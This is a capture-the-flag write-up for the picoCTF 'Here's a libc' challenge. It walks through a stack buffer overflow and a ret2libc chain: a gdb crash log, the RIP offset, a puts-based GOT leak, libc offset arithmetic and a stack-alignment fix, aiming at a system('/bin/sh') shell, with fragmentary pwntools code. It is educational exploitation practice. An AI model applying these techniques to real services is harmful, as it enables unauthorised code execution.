# Here's a libc challenge

## Category
Tags: #BinaryExploitation
Github Write-up: https://github.com/mr-r3bot/picoctf2021/tree/main/heres-a-libc
Link to challenge: https://play.picoctf.org/practice/challenge/179?category=6&page=1

## Setup

1. Identify libc version

```text
strings libc.so.6 | grep -i version

GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

2. Grabbing the linker

- Need to find a `libc 2.27` to run the `vuln` binary

- Install `pwninit`

```text
cargo install pwninit
```

`pwnint` will fetch the libc version needed to run the library

- Specify the binary `vuln` to use linker `ld-2.27.so`  lib

`patchelf --set-interpreter ./ld-2.27.so ./vuln`

3. Check binary security

```text
checksec --format=cli --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68 Symbols     No	0		0	vuln
```

=> There is no ASLR enabled for the binary
=> DEP enabled (W^X on stack)

## Explore

The binary is vulnerable to `Buffer Overflow` , because `scanf` function didn't check the length of allocated buffer

![[Pasted image 20210612173211.png]]

Run the binary with `gdb` , and send a pattern of `200` characters

```text
 Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7a
$rbx   : 0x0
$rcx   : 0x00007ffff7af4264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffe2a8  →  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
$rsi   : 0x00007ffff7dd07e3  →  0xdd18c0000000000a
$rdi   : 0x1
$rip   : 0x0000000000400770  →  <do_stuff+152> ret
$r8    : 0x79
$r9    : 0x0
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1b
$r13   : 0x0
$r14   : 0x1b
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe2a8│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"	 ← $rsp
0x00007fffffffe2b0│+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x00007fffffffe2b8│+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffe2c0│+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffe2c8│+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffe2d0│+0x0028: "waaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffe2d8│+0x0030: "xaaaaaaayaaaaaaa"
0x00007fffffffe2e0│+0x0038: "yaaaaaaa"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
     0x40076e <do_stuff+150>   nop
     0x40076f <do_stuff+151>   leave
 →   0x400770 <do_stuff+152>   ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400770 → do_stuff()
```

Figure it out at which `offset` of the characters we starting to override the `RIP` register

```text
gef➤  pattern offset $rsp
[+] Searching '$rsp'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search)
gef➤
```



## Planning 

We have to enable ASLR in gdb because GDB default not turn ASLR on. Because we want to remote exploit the system 

### How do we defeat ASLR ?
**Goal: Override Global Offset Table (GOT) and ret2libc**

=> We have to find a way to leak memory address of `function` from `libc` so we can return to (leak libc address )

Plan of attack:
- Use `puts` to leak an address
- We need to supply arguments to `puts` function (`puts` take one arguments)
- After we got the leaked address, we need to calculate the offset betwen the address function that we leaked and the function we want to return to (`system`)
- Get function execution `system(/bin/sh)` => remote shell

=> We can use ROP technique to do this( Return Oriented Programming )


## Exploit 
In x86_64 calling conventions (Linux) , arguments are place in order in the follow registers

```text
RDI (1st argument)
RSI (2nd argument)
RDX	(3rd argument)
```

Because we are using `puts` to leak memory of address and `puts` take one argument => We should find ROP gadgets that modify the `RDI` value

### Find ROP gadgets to leak memory address

```command
sudo pip3 install ROPgadget
ROPgadget --binary vuln

"""
0x0000000000400913 : pop rdi ; ret
"""
```

`scanf` function at GOT

![[Pasted image 20210612182817.png]]

`puts` function at PLT (executable address)

![[Pasted image 20210612183905.png]]



```python
scanf_got = 0x601038
pop_rdi = 0x400913
puts_at_glt = 0x400540
....
# leaked address
leaked_address = u64(p.recvline().strip().ljust(8, b"\x00")) # Add prefix to make it 8 bytes (suffix in Little Endian)
log.info(f"[+] Leaked: {hex(leaked_address)}")
```

=> Got a leak address with python script

### Calculate Offset
After our leak, we can calculate offset between the function that we leaked (`scanf`) and the function that we want (`system`)

1. Find `scanf` function offset in `libc`

```command
readelf -s libc.so.6 | grep scanf
...
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
...
```
2. Calculate base address of libc function
```python
scanf_offset_in_libc = 0x7b0b0
base_libc_address = leaked_address - scanf_offset_in_libc
```
3. Find `system` function offset in `libc`
```command
readelf -s libc.so.6 | grep system
...
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
...
```
4. Get `system` address 
```python
system_offset_in_libc = 0x4f4e0
system_addres = base_libc_address + system_offset_in_libc
```
5. Find `/bin/sh` address in libc


Load `libc.so.6` in to **Ghidra/Cutter** (Reverse Engineering tools) and search `string` for `/bin/sh` and get the offset 

```python
bin_sh_offset = 0x2b40fa
bin_sh_address = base_libc_address + bin_sh_offset
```

### Problem ran into
1. Leak function

`scanf` is not a good function to leak an address, we change to `setbuf` function ( limited in what functions are availble in libc )


2. Stack Alignment

In modern Linux system, `libc` have certain instructions that require the Stack Pointer (RSP) be 16 by the line aka **Stack pointer's last digit is zero ( \x00 )** => If it's not zero, will return in SIG Fault

**Fix stack alignment** 
We add a `ret` instruction to the payload to fix stack alignment

What `ret` instruction do is it pop the value in the stack and modify `RSP+8`

```python
ret_instruction = 0x40052e
```